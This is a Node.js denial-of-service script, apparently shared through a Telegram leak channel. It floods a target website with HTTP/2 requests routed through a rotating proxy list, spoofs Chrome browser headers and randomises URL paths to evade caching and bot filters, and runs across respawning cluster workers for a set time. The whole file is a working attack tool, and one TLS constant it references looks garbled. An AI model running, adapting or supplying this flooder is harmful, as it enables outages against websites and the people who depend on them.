const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const http2 = require('http2-wrapper');
const crypto = require('crypto');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on('uncaughtException', function (e) { console.log(e) });
process.on('unhandledRejection', function (e) { console.log(e) });

const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];

const url = new URL(target);
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

var useragent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36`;
var platform = "Windows";
var accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
var mobile = "?0";
var gogobypassknown = '';
let custom_table = 65535;
let custom_window = 6291455;
let custom_header = 262144;
let custom_update = 15663105;


const getRandomChar = () => {
    const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * pizda4.length);
    return pizda4[randomIndex];
};

setInterval(() => {
    gogobypassknown = `${getRandomChar()}`;
}, 1111);

const agent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 50000,
    maxSockets: Infinity,
    maxFreeSockets: Infinity,
    maxTotalSockets: Infinity,
    timeout: time * 1000,
});

const work = async () => {
    const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(':');

    const request = http.get({
        method: 'CONNECT',
        host: proxyHost,
        port: proxyPort,
        agent,
        path: `${url.host}:443`,
        headers: {
            'Proxy-Connection': 'Keep-Alive'
        },
        rejectUnauthorized: true,
    });

    request.on('error', request.destroy);

    request.on('connect', (res, socket, { head }) => {
        if (head?.length) return socket.destroy();

        const sessionOptions = {
            createConnection: (authority, option) => tls.connect({
                ...option,
                socket,
                ALPNProtocols: ['h2'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                session: crypto.randomBytes(64),
                secure: true,
                rejectUnauthorized: false
            }),
            settings: {
                headerTableSize: Math.random() < 0.5 ? custom_header : "",
                enablePush: false,
                initialWindowSize: Math.random() < 0.5 ? custom_window : "",
                maxHeaderListSize: Math.random() < 0.5 ? custom_table : "",
            },
        };

        const sessionState = { flags: 0 };

        const session = http2.connect(`https://${url.host}`, sessionOptions, () => {
            session.setLocalWindowSize(custom_update);
        });

        let activeRequests = 0;
        let timeoutHandle;

        const resetTimeout = () => {
            clearTimeout(timeoutHandle);
            timeoutHandle = setTimeout(() => activeRequests && session.destroy(), 3000);
        };

        const closeSessionIfDone = () => {
            if (!activeRequests) {
                sessionState.flags |= 1;
                session.destroy();
            }
        };

        session.on('error', () => {
            sessionState.flags |= 1;
            session.destroy();
        });

        let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
        let version = Math.floor(Math.random() * (103 - 100 + 1) + 100);
        useragent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.0.0 Safari/537.36`;
        const headers = Object.entries({
            ":method": "GET",
            ":authority": url.hostname,
            ":scheme": "https",
            ":path": url.pathname + `${gogobypassknown}`,
        }).concat(Object.entries({
            "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${generateNumbers}\", \"Google Chrome\";v=\"${version}\"`,
            "sec-ch-ua-mobile": `${mobile}`,
            "sec-ch-ua-platform": `${platform}`,
            "upgrade-insecure-requests": "1",
            "user-agent": `${useragent}`,
            "accept": `${accept}`,
        }).filter(a => a[1] != null));

        const headers2 = Object.entries({
            "sec-fetch-site": "none",
            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
        }).filter(a => a[1] != null);

        const headers3 = Object.entries({
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": `мамут`,
            ...(Math.random() < 0.5 && { "cookie": `${generateNumbers}` }),
            ...(Math.random() < 0.5 && { "referer": `https://${url.hostname}/${generateNumbers}` }),
        }).filter(a => a[1] != null);

        for (let i = headers3.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [headers3[i], headers3[j]] = [headers3[j], headers3[i]];
        }

        const combinedHeaders = headers.concat(headers2).concat(headers3);

        session.on('connect', () => {
            Array.from({ length: ratelimit }).forEach((_, index) => {
                const headersData = combinedHeaders;
                requestHandler(session, headersData, index);
            });
            resetTimeout();
        });

        const requestHandler = (session, headersData, index) => {
            const headersObj = http2.headers(headersData);

            const req = session.request(headersObj);
            req.setEncoding('utf8');

            function finalizeRequest() {
                activeRequests--;
                closeSessionIfDone();
            }

            req.on('response', (headers, flags) => {
                console.log('Status Code:', headers[':status']);
            });

            req.on('ready', () => {
                for (let i = 0; i < 50; i++) {
                    req.write(`${getRandomChar()}`, 'utf8');
                }
                req.end();
                finalizeRequest();
            });

            req.on('headers', (headers) => {
                finalizeRequest();
            });

            req.on('data', (chunk) => { });

            req.on('end', finalizeRequest);

            req.on('error', (err) => {
                console.error('Request Error:', err);
                finalizeRequest();
            });
        };

        session.on('goaway', (errorCode, lastStreamID, opaqueData) => {
            console.log('GOAWAY received with error code:', errorCode);
            console.log('Last Stream ID:', lastStreamID);
            console.log('Opaque Data:', opaqueData ? opaqueData.toString() : '');
        });
    });

    request.end();
};

if (cluster.isMaster) {
    console.log('@leaksmain || https://t.me/leaksmain');
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(work);
    setTimeout(() => process.exit(1), time * 1000);
}